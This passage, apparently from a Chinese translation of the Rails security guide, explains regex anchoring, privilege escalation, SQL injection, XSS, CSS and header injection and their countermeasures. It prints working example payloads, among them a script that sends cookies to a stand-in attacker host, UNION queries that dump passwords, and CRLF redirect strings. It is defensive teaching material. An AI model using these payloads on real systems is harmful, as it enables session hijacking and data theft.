Ruby 使用了有别于其他编程语言的方式来匹配字符串的开头和结尾。这也是为什么很多 Ruby/Rails 相关的书籍都搞错了。为什么这是个安全隐患呢？如果想不太严格的验证 URL 字段，使用了如下的正则表达式：

{:lang="ruby"}
~~~
/^https?:\/\/[^\n]+$/i
~~~

在某些编程语言中可能没问题，但在 Ruby 中，`^` 和 `$` 分别匹配一行的开头和结尾。因此下面这种 URL 能通过验证：

~~~
javascript:exploit_code();/*
http://hi.com
*/
~~~

之所以能通过，是因为第二行匹配了正则表达式，其他两行无关紧要。假设在视图中要按照下面的方式显示 URL：

{:lang="ruby"}
~~~
link_to "Homepage", @user.homepage
~~~

访问者不会觉得这个链接有问题，点击之后，却执行了 `exploit_code` 这个 JavaScript 函数，或者攻击者提供的其他 JavaScript 代码。

修正这个正则表达式的方法是，分别用 `\A` 和 `\z` 代替 `^` 和 `$`，如下所示：

{:lang="ruby"}
~~~
/\Ahttps?:\/\/[^\n]+\z/i
~~~

因为这种问题经常出现，如果使用的正则表达式以 `^` 开头，或者以 `$` 结尾，格式验证器（`validates_format_of`）会抛出异常。如果确实需要使用 `^` 和 `$`（但很少见），可以把 `:multiline` 选项设为 `true`，如下所示：

{:lang="ruby"}
~~~
# content should include a line "Meanwhile" anywhere in the string
validates :content, format: { with: /^Meanwhile$/, multiline: true }
~~~

注意，这种方式只能避免格式验证中出现的常见错误。你要牢记，在 Ruby 中 `^` 和 `$` 分别匹配**行**的开头和结尾，不是整个字符串的开头和结尾。

### 权限提升

W> 只需修改一个参数就可能赋予用户未授权的权限。记住，不管你怎么隐藏参数，还是可能被修改。

用户最可能篡改的参数是 ID，例如在 `http://www.domain.com/project/1` 中，ID 为 1，这个参数的值在控制器中可通过 `params` 获取。在控制器中可能会做如下的查询：

{:lang="ruby"}
~~~
@project = Project.find(params[:id])
~~~

在某些程序中这么做没问题，但如果用户没权限查看所有项目就不能这么做。如果用户把 ID 改为 42，但其实无权查看这个项目的信息，用户还是能够看到。我们应该同时查询用户的访问权限：

{:lang="ruby"}
~~~
@project = @current_user.projects.find(params[:id])
~~~

不同的程序用户可篡改的参数也不同，谨记一个原则，用户输入的数据未经验证之前都是不安全的，传入的每个参数都有潜在危险。

别傻了，隐藏参数或者使用 JavaScript 根本就无安全性可言。使用 Firefox 的开发者工具可以修改表单中的每个隐藏字段。JavaScript 只能验证用户的输入数据，但不能避免攻击者发送恶意请求。Firefox 的 Live Http Headers 插件可以记录每次请求，而且能重复请求或者修改请求内容，很容易就能跳过 JavaScript 验证。有些客户端代理还能拦截任意请求和响应。

## 注入

NOTE: 注入这种攻击方式可以把恶意代码或参数写入程序，在程序所谓安全的环境中执行。常见的注入方式有跨站脚本和 SQL 注入。

注入具有一定技巧性，一段代码或参数在一个场合是恶意的，但换个场合可能就完全无害。这里所说的“场合”可以是一个脚本，查询，编程语言，shell 或者 Ruby/Rails 方法。下面各节分别介绍注入攻击可能发生的场合。不过，首先我们要说明和注入有关的架构决策。

### 白名单 VS. 很名单

NOTE: 过滤、保护或者验证时白名单比黑名单好。

黑名单可以是一组不可用的 Email 地址，非公开的动作或者不能使用的 HTML 标签。白名单则相反，是一组可用的 Email 地址，公开的动作和可用的 HTML 标签。某些情况下无法创建白名单（例如，垃圾信息过滤），但下列场合推荐使用白名单：

* `before_action` 的选项使用 `only: [...]`，而不是 `except: [...]`。这样做，新建的动作就不会误入 `before_action`。
* 防范跨站脚本时推荐加上 `<strong>` 标签，不要删除 `<script>` 元素。详情参见后文。
* 不要尝试使用黑名单修正用户的输入
    * 这么做会成全这种攻击：`"<sc<script>ript>".gsub("<script>", "")`
    * 直接拒绝即可

使用白名单还能避免忘记黑名单中的内容。

### SQL 注入

NOTE: Rails 中的方法足够智能，能避免 SQL 注入。但 SQL 注入是网页程序中比较常见且危险性高的攻击方式，因此有必要了解一下。

#### 简介

SQL 注入通过修改传入程序的参数，影响数据库查询。常见目的是跳过授权管理系统，处理数据或读取任意数据。下面举例说明为什么要避免在查询中使用用户输入的数据。

{:lang="ruby"}
~~~
Project.where("name = '#{params[:name]}'")
~~~

这个查询可能出现在搜索动作中，用户输入想查找的项目名。如果恶意用户输入 `' OR 1 --`，得到的 SQL 查询为：

{:lang="sql"}
~~~
SELECT * FROM projects WHERE name = '' OR 1 --'
~~~

两根横线表明注释开始，后面所有的语句都会被忽略。所以上述查询会读取 `projects` 表中所有记录，包括向用户隐藏的记录。这是因为所有记录都满足查询条件。

#### 跳过授权

网页程序中一般都有访问控制功能。用户输入登录密令后，网页程序试着在用户数据表中找到匹配的记录。如果找到了记录就赋予用户相应的访问权限。不过，攻击者可通过 SQL 注入跳过这种检查。下面显示了 Rails 中一个常见的数据库查询，在用户表中查询匹配用户输入密令的第一个记录。

{:lang="ruby"}
~~~
User.first("login = '#{params[:name]}' AND password = '#{params[:password]}'")
~~~

如果用户输入的 `name` 参数值为 `' OR '1'='1`，`password` 参数的值为 `' OR '2'>'1`，得到的 SQL 查询为：

{:lang="sql"}
~~~
SELECT * FROM users WHERE login = '' OR '1'='1' AND password = '' OR '2'>'1' LIMIT 1
~~~

这个查询直接在数据库中查找第一个记录，然后赋予其相应的权限。

#### 未经授权读取数据

`UNION` 语句连接两个 SQL 查询，返回的结果只有一个集合。攻击者利用 `UNION` 语句可以从数据库中读取任意数据。下面来看个例子：

{:lang="ruby"}
~~~
Project.where("name = '#{params[:name]}'")
~~~

注入一个使用 `UNION` 语句的查询：

~~~
') UNION SELECT id,login AS name,password AS description,1,1,1 FROM users --
~~~

得到的 SQL 查询如下：

{:lang="sql"}
~~~
SELECT * FROM projects WHERE (name = '') UNION
  SELECT id,login AS name,password AS description,1,1,1 FROM users --'
~~~

上述查询的结果不是一个项目集合（因为找不到没有名字的项目），而是一组由用户名和密码组成的集合。真希望你加密了存储在数据库中的密码！攻击者要为两个查询语句提供相同的字段数量。所以在第二个查询中有很多 `1`。攻击者可以总是使用 `1`，只要字段的数量和第一个查询一样即可。

而且，第二个查询使用 `AS` 语句重命名了某些字段，这样程序就能显示出从用户表中查询得到的数据。

#### 对策

Rails 内建了能过滤 SQL 中特殊字符的过滤器，会转义 `'`、`"`、`NULL` 和换行符。`Model.find(id)` 和 `Model.find_by_something(something)` 会自动使用这个过滤器。但在 SQL 片段中，尤其是条件语句（`where("...")`），`connection.execute()` 和 `Model.find_by_sql()` 方法，需要手动调用过滤器。

请不要直接传入条件语句，而要传入一个数组，进行过滤。如下所示：

{:lang="ruby"}
~~~
Model.where("login = ? AND password = ?", entered_user_name, entered_password).first
~~~

如上所示，数组的第一个元素是包含问号的 SQL 片段，要过滤的内容是数组其后的元素，过滤后的值会替换第一个元素中的问号。传入 Hash 的作用相同：

{:lang="ruby"}
~~~
Model.where(login: entered_user_name, password: entered_password).first
~~~

数组或 Hash 形式只能在模型实例上使用。其他地方可使用 `sanitize_sql()` 方法。在 SQL 中使用外部字符串时要时刻警惕安全性。

### 跨站脚本

NOTE: 网页程序中影响范围最广、危害性最大的安全漏洞是跨站脚本。这种恶意攻击方式在客户端注入可执行的代码。Rails 提供了防御这种攻击的帮助方法。

#### 切入点

切入点是攻击者可用来发起攻击的漏洞 URL 地址和其参数。

常见的切入点有文章、用户评论、留言本，项目的标题、文档的名字和搜索结果页面也经常受到攻击，只要用户能输入数据的地方都有危险。输入的数据不一定来自网页中的输入框，也可以来自任何 URL 参数（公开参数，隐藏参数或者内部参数）。记住，用户能拦截任何通信。Firefox 的 [Live HTTP Headers](http://livehttpheaders.mozdev.org/) 插件，以及客户端代码能轻易的修改请求数据。

跨站脚本攻击的工作方式是这样的：攻击者注入一些代码，程序将其保存并在页面中显示出来。大多数跨站脚本只显示一个弹窗，但危险性极大。跨站脚本可以窃取 cookie，劫持会话，把用户引向虚假网站，显示广告让攻击者获利，修改网页中的元素获取机密信息，或者通过浏览器的安全漏洞安装恶意软件。

2007 年下半年，Mozilla 浏览器发现了 88 个漏洞，Safari 发现了 22 个漏洞，IE 发现了 18 个漏洞，Opera 发现了 12 个漏洞。[赛门铁克全球互联网安全威胁报告](http://eval.symantec.com/mktginfo/enterprise/white_papers/b-whitepaper_internet_security_threat_report_xiii_04-2008.en-us.pdf)指出，2007 年下半年共发现了 238 个浏览器插件导致的漏洞。对黑客来说，网页程序框架爆出的 SQL 注入漏洞很具吸引力，他们可以利用这些漏洞在数据表中的每个文本字段中插入恶意代码。2008 年 4 月，有 510000 个网站被这种方法攻破，其中英国政府和美国政府的网站是最大的目标。

一个相对较新、不常见的切入点是横幅广告。[Trend Micro](http://blog.trendmicro.com/myspace-excite-and-blick-serve-up-malicious-banner-ads/) 的文章指出，2008 年早些时候在流行的网站（例如 MySpace 和 Excite）中发现了横幅广告中包含恶意代码。

#### HTML/JavaScript 注入

跨站脚本最常用的语言当然是使用最广泛的客户端脚本语言 JavaScript，而且经常掺有 HTML。转义用户的输入是最基本的要求。

下面是一段最直接的跨站脚本：

{:lang="html"}
~~~
<script>alert('Hello');</script>
~~~

上面的 JavaScript 只是显示一个提示框。下面的例子作用相同，但放在不太平常的地方：

{:lang="html"}
~~~
<img src=javascript:alert('Hello')>
<table background="javascript:alert('Hello')">
~~~

##### 盗取 cookie

上面的例子没什么危害，下面来看一下攻击者如何盗取用户 cookie（因此也能劫持会话）。在 JavaScript 中，可以使用 `document.cookie` 读写 cookie。JavaScript 强制使用同源原则，即一个域中的脚本无法访问另一个域中的 cookie。`document.cookie` 属性中保存的 cookie 来自源服务器。不过，如果直接把代码放在 HTML 文档中（就跟跨站脚本一样），就可以读写这个属性。把下面的代码放在程序的任何地方，看一下页面中显示的 cookie 值：

{:lang="html"}
~~~
<script>document.write(document.cookie);</script>
~~~

对攻击者来说，这么做没什么用，因为用户看到了自己的 cookie。下面这个例子会从 http://www.attacker.com/ 加载一个图片和 cookie。当然，这个地址并不存在，因此浏览器什么也不会显示。但攻击者可以查看服务器的访问日志获取用户的 cookie。

{:lang="html"}
~~~
<script>document.write('<img src="http://www.attacker.com/' + document.cookie + '">');</script>
~~~

www.attacker.com 服务器上的日志文件中可能有这么一行记录：

~~~
GET http://www.attacker.com/_app_session=836c1c25278e5b321d6bea4f19cb57e2
~~~

在 cookie 中加上 [httpOnly](http://dev.rubyonrails.org/ticket/8895) 标签可以避免这种攻击，加上 httpOnly 后，JavaScript 就无法读取 `document.cookie` 属性的值。IE v6.SP1、Firefox v2.0.0.5 和 Opera 9.5 都支持只能使用 HTTP 请求访问的 cookie，Safari 还在考虑这个功能，暂时会忽略这个选项。但在其他浏览器，或者旧版本的浏览器（例如 WebTV 和 Mac 系统中的 IE 5.5）中无法加载页面。有一点要注意，使用 [Ajax 仍可读取 cookie](http://ha.ckers.org/blog/20070719/firefox-implements-httponly-and-is-vulnerable-to-xmlhttprequest/)。

##### 涂改

攻击者可通过网页涂改做很多事情，例如，显示错误信息，或者引导用户到攻击者的网站，偷取登录密码或者其他敏感信息。最常见的涂改方法是使用 iframe 加载外部代码：

{:lang="html"}
~~~
<iframe name="StatPage" src="http://58.xx.xxx.xxx" width=5 height=5 style="display:none"></iframe>
~~~

iframe 可以从其他网站加载任何 HTML 和 JavaScript。上述 iframe 是使用 [Mpack 框架](http://isc.sans.org/diary.html?storyid=3015)攻击意大利网站的真实代码。Mpack 尝试通过浏览器的安全漏洞安装恶意软件，成功率很高，有 50% 的攻击成功了。

更特殊的攻击是完全覆盖整个网站，或者显示一个登陆框，看去来和原网站一模一样，但把用户名和密码传给攻击者的网站。还可使用 CSS 或 JavaScript 把网站中原来的链接隐藏，换上另一个链接，把用户带到仿冒网站上。

还有一种攻击方式不保存信息，把恶意代码包含在 URL 中。如果搜索表单不过滤搜索关键词，这种攻击就更容易实现。下面这个链接显示的页面中包含这句话“乔治&bull;布什任命 9 岁男孩为主席...”：

~~~
http://www.cbsnews.com/stories/2002/02/15/weather_local/main501644.shtml?zipcode=1-->
  <script src=http://www.securitylab.ru/test/sc.js></script><!--
~~~

##### 对策

NOTE: 过滤恶意输入很重要，转义输出也同样重要。

对跨站脚本来说，过滤输入值一定要使用白名单而不是黑名单。白名单指定允许输入的值。黑名单则指定不允许输入的值，无法涵盖所有禁止的值。

假设黑名单从用户的输入值中删除了 `script`，但如果攻击者输入 `<scrscriptipt>`，过滤后剩余的值是 `<script>`。在以前版本的 Rails 中，`strip_tags()`、`strip_links()` 和 `sanitize()` 方法使用黑名单。所以下面这种注入完全可行：

{:lang="ruby"}
~~~
strip_tags("some<<b>script>alert('hello')<</b>/script>")
~~~

上述方法的返回值是 `some<script>alert('hello')</script>`，仍然可以发起攻击。所以我才支持使用白名单，使用 Rails 2 中升级后的 `sanitize()` 方法：

{:lang="ruby"}
~~~
tags = %w(a acronym b strong i em li ul ol h1 h2 h3 h4 h5 h6 blockquote br cite sub sup ins p)
s = sanitize(user_input, tags: tags, attributes: %w(href title))
~~~

这个方法只允许使用指定的标签，效果很好，能对付各种诡计和改装的标签。

而后，还要转义程序的所有输出，尤其是要转义输入时没有过滤的用户输入值（例如前面举过的搜索表单例子）。使用 `escapeHTML()` 方法（或者别名 `h()`）把 HTML 中的 `&`、`"`、`<` 和`>` 字符替换成 `&amp;`、`&quot;`、`&lt;` 和 `&gt;`。不过开发者很容易忘记这么做，所以推荐使用 [SafeErb](http://safe-erb.rubyforge.org/svn/plugins/safe_erb/) 插件，SafeErb 会提醒你转义外部字符串。

##### 编码注入

网络流量大都使用有限的西文字母传输，所以后来出现了新的字符编码方式传输其他语种的字符。这也为网页程序带来了新的威胁，因为恶意代码可以隐藏在不同的编码字符中，浏览器可以处理这些编码，但网页程序不一定能处理。下面是使用 UTF-8 编码攻击的例子：

~~~
<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;
  &#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
~~~

上面的代码会弹出一个提示框。`sanitize()` 方法可以识别这种代码。编码字符串的一个好用工具是 [Hackvertor](https://hackvertor.co.uk/public)，使用这个工具可以做到知己知彼。Rails 的 `sanitize()` 方法能有效避免编码攻击。

#### 真实案例

要想理解现今对网页程序的攻击方式，最好看几个真实案例。

下面的代码摘自针对 Yahoo! 邮件的[蠕虫病毒](http://groovin.net/stuff/yammer.txt)，由 [Js.Yamanner@m](http://www.symantec.com/security_response/writeup.jsp?docid=2006-061211-4111-99&tabid=1) 制作，发生在 2006 年 6 月 11 日，是第一个针对网页邮件客户端的蠕虫病毒：

~~~
<img src='http://us.i1.yimg.com/us.yimg.com/i/us/nt/ma/ma_mail_1.gif'
  target=""onload="var http_request = false;    var Email = '';
  var IDList = '';   var CRumb = '';   function makeRequest(url, Func, Method,Param) { ...
~~~

这个蠕虫病毒利用 Yahoo 的 HTML/JavaScript 过滤器漏洞。这个过滤器过滤标签中所有的 `target` 和 `onload` 属性，因为这两个属性的值可以是 JavaScript 代码。这个过滤器只会执行一次，所以包含蠕虫病毒代码的 `onload` 属性不会被过滤掉。这个例子很好的说明了黑名单很难以偏概全，也说明了在网页程序中为什么很难提供输入 HTML/JavaScript 的支持。

还有一个概念性的蠕虫是 Nduja，这个蠕虫可以跨域攻击四个意大利网页邮件服务。详情参见 [Rosario Valotta 的论文](http://www.xssed.com/news/37/Nduja_Connection_A_cross_webmail_worm_XWW/)。以上两种邮件蠕虫的目的都是获取 Email 地址，黑客可从中获利。

2006 年 12 月，一次 [MySpace 钓鱼攻击](http://news.netcraft.com/archives/2006/10/27/myspace_accounts_compromised_by_phishers.html)泄露了 34000 个真实地用户名和密码。这次攻击的方式是创建一个名为“login_home_index_html”的资料页，URL 地址看起来很正常，但使用了精心制作的 HTML 和 CSS 隐藏真实的由 MySpace 生成的内容，显示了一个登录表单。

MySpace Samy 蠕虫在“[CSS 注入](#css-injection)”一节说明。

### CSS 注入

NOTE: CSS 注入其实就是 JavaScript 注入，因为有些浏览器（IE，某些版本的 Safari 等）允许在 CSS 中使用 JavaScript。允许在程序中使用自定义的 CSS 时一定要三思。

CSS 注入的原理可以通过有名的 [MySpace Samy 蠕虫](http://namb.la/popular/tech.html)说明。访问 Samy（攻击者）的 MySpace 资料页时会自动向 Samy 发出好友请求。几小时之内 Samy 就收到了超过一百万个好友请求，消耗了 MySpace 大量流量，导致网站瘫痪。下面从技术层面分析这个蠕虫。

MySpace 禁止使用很多标签，但却允许使用 CSS。所以，蠕虫的作者按照下面的方式在 CSS 中加入了 JavaScript 代码：

{:lang="html"}
~~~
<div style="background:url('javascript:alert(1)')">
~~~

因此问题的关键是 `style` 属性，但属性的值中不能含有引号，因为单引号和双引号都已经使用了。但是 JavaScript 中有个很实用的 `eval()` 函数，可以执行任意字符串：

{:lang="html"}
~~~
<div id="mycode" expr="alert('hah!')" style="background:url('javascript:eval(document.all.mycode.expr)')">
~~~

`eval()` 函数对黑名单过滤来说是个噩梦，可以把 `innerHTML` 隐藏在 `style` 属性中：

{:lang="js"}
~~~
alert(eval('document.body.inne' + 'rHTML'));
~~~

MySpace 会过滤 `javascript` 这个词，所以蠕虫作者使用 `java<NEWLINE>script` 绕过了这个限制：

{:lang="html"}
~~~
<div id="mycode" expr="alert('hah!')" style="background:url('java↵ script:eval(document.all.mycode.expr)')">
~~~

蠕虫作者面对的另一个问题是 CSRF 安全权标。没有安全权标就无法通过 POST 请求发送好友请求。蠕虫作者先向页面发起 GET 请求，然后再添加用户，处理 CSRF 权标。

最终，只用 4KB 空间就写好了这个蠕虫，注入到自己的资料页面。

CSS 中的 [moz-binding](http://www.securiteam.com/securitynews/5LP051FHPE.html) 属性也被证实可在基于 Gecko 的浏览器（例如 Firefox）中把 Javascript 写入 CSS 中。

#### 对策

这个例子再次证明黑名单不能以偏概全。自定义 CSS 在网页程序中是个很少见的功能，因此我也不知道怎么编写 CSS 白名单过滤器。如果想让用户自定义颜色或图片，可以让用户选择颜色或图片，再由网页程序生成 CSS。如果真的需要 CSS 白名单过滤器，可以使用 Rails 的 `sanitize()` 方法。

### Textile 注入

如果想提供 HTML 之外的文本格式化方式（基于安全考虑），可以使用能转换为 HTML 的标记语言。[RedCloth](http://redcloth.org/) 就是一种使用 Ruby 编写的转换工具。使用前要注意，RedCloth 也有跨站脚本漏洞。

例如，RedCloth 会把 `_test_` 转换成 `<em>test</em>`，斜体显示文字。不过到最新的 3.0.4 版本，仍然有跨站脚本漏洞。请安装已经解决安全问题的[全新第 4 版](http://www.redcloth.org)。可是这个版本还有[一些安全隐患](http://www.rorsecurity.info/journal/2008/10/13/new-redcloth-security.html)。下面的例子针对 V3.0.4：

{:lang="ruby"}
~~~
RedCloth.new('<script>alert(1)</script>').to_html
# => "<script>alert(1)</script>"
~~~

使用 `:filter_html` 选项可以过滤不是由 RedCloth 生成的 HTML：

{:lang="ruby"}
~~~
RedCloth.new('<script>alert(1)</script>', [:filter_html]).to_html
# => "alert(1)"
~~~

不过，这个选项不能过滤全部的 HTML，会留下一些标签（程序就是这样设计的），例如 `<a>`：

{:lang="ruby"}
~~~
RedCloth.new("<a href='javascript:alert(1)'>hello</a>", [:filter_html]).to_html
# => "<p><a href="javascript:alert(1)">hello</a></p>"
~~~

#### 对策

建议使用 RedCloth 时要同时使用白名单过滤输入值，这一点在应对跨站脚本攻击时已经说过。

### Ajax 注入

NOTE: 在常规动作上运用的安全预防措施在 Ajax 动作上也要使用。不过有一个例外：如果动作不渲染视图，在控制器中就要做好转义。

如果使用 [in_place_editor](http://dev.rubyonrails.org/browser/plugins/in_place_editing) 插件，或者动作不渲染视图只返回字符串，就要在动作中转义返回值。否则，如果返回值中包含跨站脚本，发送到浏览器时就会执行。请使用 `h()` 方法转义所有输入值。

### 命令行注入

NOTE: 使用用户输入的命令行参数时要小心。

如果程序要在操作系统层面执行命令，可以使用 Ruby 提供的几个方法：`exec(command)`，`syscall(command)`，`system(command)` 和 `command`。如果用户可以输入整个命令，或者命令的一部分，这时就要特别注意。因为在大多数 shell 中，两个命令可以写在一起，使用分号（`;`）或者竖线（`|`）连接。

为了避免这类问题，可以使用 `system(command, parameters)` 方法，这样传入的命令行参数更安全。

{:lang="ruby"}
~~~
system("/bin/echo","hello; rm *")
# prints "hello; rm *" and does not delete files
~~~

### 报头注入

W> HTTP 报头是动态生成的，某些情况下可能会包含用户注入的值，导致恶意重定向、跨站脚本或者 HTTP 响应拆分（HTTP response splitting）。

HTTP 请求报头中包含 `Referer`，`User-Agent`（客户端软件）和 `Cookie` 等字段。响应报头中包含状态码，`Cookie` 和 `Location`（重定向的目标 URL）等字段。这些字段都由用户提供，可以轻易修改。记住，报头也要转义。例如，在管理页面中显示 `User-Agent` 时。

除此之外，基于用户输入值构建响应报头时还要格外小心。例如，把用户重定向到指定的页面。重定向时需要在表单中加入 `referer` 字段：

{:lang="ruby"}
~~~
redirect_to params[:referer]
~~~

Rails 会把这个字段的值提供给 `Location` 报头，并向浏览器发送 302（重定向）状态码。恶意用户可以做的第一件事是：

~~~
http://www.yourapplication.com/controller/action?referer=http://www.malicious.tld
~~~

Rails 2.1.2 之前有个漏洞，黑客可以注入任意的报头字段，例如：

~~~
http://www.yourapplication.com/controller/action?referer=http://www.malicious.tld%0d%0aX-Header:+Hi!
http://www.yourapplication.com/controller/action?referer=path/at/your/app%0d%0aLocation:+http://www.malicious.tld
~~~

注意，`%0d%0a` 是编码后的 `\r\n`，在 Ruby 中表示回车换行（CRLF）。上面的例子得到的 HTTP 报头如下所示，第二个 `Location` 覆盖了第一个：

~~~
HTTP/1.1 302 Moved Temporarily
(...)
Location: http://www.malicious.tld
~~~

报头注入就是在报头中注入 CRLF 字符。那么攻击者是怎么进行恶意重定向的呢？攻击者可以把用户重定向到钓鱼网站，要求再次登录，把登录密令发送给攻击者。或者可以利用浏览器的安全漏洞在网站中安装恶意软件。Rails 2.1.2 在 `redirect_to` 方法中转义了传给 `Location` 报头的值。使用用户的输入值构建报头时要手动进行转义。

#### 响应拆分

既然报头注入有可能发生，响应拆分也有可能发生。在 HTTP 响应中，报头后面跟着两个 CRLF，然后是真正的数据（HTML）。响应拆分的原理是在报头中插入两个 CRLF，后跟其他的响应，包含恶意 HTML。响应拆分示例：

~~~
HTTP/1.1 302 Found [First standard 302 response]
Date: Tue, 12 Apr 2005 22:09:07 GMT
Location: Content-Type: text/html


HTTP/1.1 200 OK [Second New response created by attacker begins]
Content-Type: text/html


&lt;html&gt;&lt;font color=red&gt;hey&lt;/font&gt;&lt;/html&gt; [Arbitary malicious input is
Keep-Alive: timeout=15, max=100         shown as the redirected page]
Connection: Keep-Alive
Transfer-Encoding: chunked
Content-Type: text/html
~~~

某些情况下，拆分后的响应会把恶意 HTML 显示给用户。不过这只会在 `Keep-Alive` 连接中发生，大多数浏览器都使用一次性连接。但你不能依赖这一点。不管怎样这都是个严重的隐患，你需要升级到 Rails 最新版，消除报头注入风险（因此也就避免了响应拆分）。

## 生成的不安全查询

根据 Active Record 处理参数的方式以及 Rack 解析请求参数的方式，攻击者可以通过 `WHERE IS NULL` 子句发起异常数据库查询。为了应对这种安全隐患（[CVE-2012-2660](https://groups.google.com/forum/#!searchin/rubyonrails-security/deep_munge/rubyonrails-security/8SA-M3as7A8/Mr9fi9X4kNgJ)，[CVE-2012-2694](https://groups.google.com/forum/#!searchin/rubyonrails-security/deep_munge/rubyonrails-security/jILZ34tAHF4/7x0hLH-o0-IJ) 和 [CVE-2013-0155](https://groups.google.com/forum/#!searchin/rubyonrails-security/CVE-2012-2660/rubyonrails-security/c7jT-EeN9eI/L0u4e87zYGMJ)），Rails 加入了 `deep_munge` 方法，增加安全性。

如果不使用 `deep_munge` 方法，下面的代码有被攻击的风险：

{:lang="ruby"}
~~~
unless params[:token].nil?
  user = User.find_by_token(params[:token])
  user.reset_password!
end
~~~

如果 `params[:token]` 的值是 `[]`、`[nil]`、`[nil, nil, ...]` 或 `['foo', nil]` 之一，会跳过 `nil?` 检查，但 `WHERE` 子句 `IS NULL` 或 `IN ('foo', NULL)` 还是会添加到 SQL 查询中。

为了保证 Rails 的安全性，`deep_munge` 方法会把某些值替换成 `nil`。下表显示在请求中发送 JSON 格式数据时得到的参数：

| JSON                              | 参数                     |
|-----------------------------------|--------------------------|
| `{ "person": null }`              | `{ :person => nil }`     |
| `{ "person": [] }`                | `{ :person => nil }`     |
| `{ "person": [null] }`            | `{ :person => nil }`     |
| `{ "person": [null, null, ...] }` | `{ :person => nil }`     |
| `{ "person": ["foo", null] }`     | `{ :person => ["foo"] }` |

如果知道这种风险，也知道如何处理，可以通过设置禁用 `deep_munge`，使用原来的处理方式：

{:lang="ruby"}
~~~
config.action_dispatch.perform_deep_munge = false
~~~

## 默认报头

Rails 程序返回的每个 HTTP 响应都包含下面这些默认的安全报头：

{:lang="ruby"}
~~~
config.action_dispatch.default_headers = {
  'X-Frame-Options' => 'SAMEORIGIN',
  'X-XSS-Protection' => '1; mode=block',
  'X-Content-Type-Options' => 'nosniff'
}
~~~

默认的报头可在文件 `config/application.rb` 中设置：

{:lang="ruby"}
~~~
config.action_dispatch.default_headers = {
  'Header-Name' => 'Header-Value',
  'X-Frame-Options' => 'DENY'
}
~~~

当然也可删除默认报头：

{:lang="ruby"}
~~~
config.action_dispatch.default_headers.clear
~~~

下面是一些常用的报头：

* `X-Frame-Options`：Rails 中的默认值是 `SAMEORIGIN`，允许使用同域中的 iframe。设为 `DENY` 可以完全禁止使用 iframe。如果允许使用所有网站的 iframe，可以设为 `ALLOWALL`。
* `X-XSS-Protection`：Rails 中的默认值是 `1; mode=block`，使用跨站脚本审查程序，如果发现跨站脚本攻击就不显示网页。如果想关闭跨站脚本审查程序，可以设为 `0;`（如果响应中包含请求参数中传入的脚本）。
* `X-Content-Type-Options`：Rails 中的默认值是 `nosniff`，禁止浏览器猜测文件的 MIME 类型。
* `X-Content-Security-Policy`：一种[强大的机制](http://dvcs.w3.org/hg/content-security-policy/raw-file/tip/csp-specification.dev.html)，控制可以从哪些网站加载特定类型的内容。
* `Access-Control-Allow-Origin`：设置哪些网站可以不沿用同源原则，发送跨域请求。
* `Strict-Transport-Security`：设置是否强制浏览器使用[安全连接](http://en.wikipedia.org/wiki/HTTP_Strict_Transport_Security)访问网站。

## 环境相关的安全问题

增加程序代码和环境安全性的话题已经超出了本文范围。但记住要保护好数据库设置（`config/database.yml`）以及服务器端密令（`config/secrets.yml`）。更进一步，为了安全，这两个文件以及其他包含敏感数据的文件还可使用环境专用版本。

## 其他资源

安全漏洞层出不穷，所以一定要了解最新信息，新的安全漏洞可能会导致灾难性的后果。安全相关的信息可从下面的网站获取：

* Ruby on Rails 安全项目，经常会发布安全相关的新闻：<http://www.rorsecurity.info>；
* 订阅 Rails [安全邮件列表](http://groups.google.com/group/rubyonrails-security)；
* [时刻关注程序所用组件的安全问题](http://secunia.com/)（还有周报）；
* [优秀的安全博客](http://ha.ckers.org/blog/)，包含一个[跨站脚本速查表](http://ha.ckers.org/xss.html)；
